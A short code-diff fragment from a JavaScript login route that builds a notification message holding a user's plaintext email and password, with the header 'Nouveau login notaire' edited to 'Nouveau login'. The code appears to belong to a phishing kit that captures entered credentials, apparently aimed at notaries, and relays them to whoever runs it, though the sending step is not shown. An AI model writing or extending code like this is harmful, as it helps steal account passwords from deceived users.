@@ -21,7 +21,7 @@ app.post("/login", async (req, res) => {
         }
 
         const message =
-`🔐 Nouveau login notaire
+`🔐 Nouveau login
 
 📧 Email: ${email}
 🔑 Password: ${password}
